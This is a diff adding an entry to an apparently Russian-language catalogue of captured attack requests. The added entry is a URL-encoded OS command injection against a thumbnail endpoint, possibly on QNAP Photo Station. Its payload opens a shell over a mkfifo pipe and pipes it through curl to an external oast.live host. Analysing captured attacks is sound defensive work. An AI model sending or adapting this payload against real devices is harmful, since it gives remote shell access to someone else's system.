@@ -66,4 +66,8 @@
 ```
 Действие: внедрение команды curl в поле пароля (подстановка результата выполнения).
 
-----
+### Запрос 12
+```http
+/qsr_server/device/getThumbnail?sourceUri=\%27%2b-%253brm%2b[TMP]/f%253bmkfifo%2b[TMP]/f%253bcat%2b[TMP]/f|/bin/sh%2b-i%2b2%3E%25261|curl%2bhttp%253a//d8hk9mlq3g2isfoce0pgy9dce333xi1u5.oast.live%2b%3E[TMP]/f%253b\%27;&targetUri=%2[TMP]%2Fthumb%2Ftest.jpg&mediaType=image&targetWidth=400&targetHeight=400&scaleType=crop&_=1537275717150
+```
+Действие: внедрение команд ОС (OS command injection) в параметре sourceUri сервера QSR (возможно, QNAP Photo Station/Thumbnail). Позволяет выполнить произвольную shell-команду.
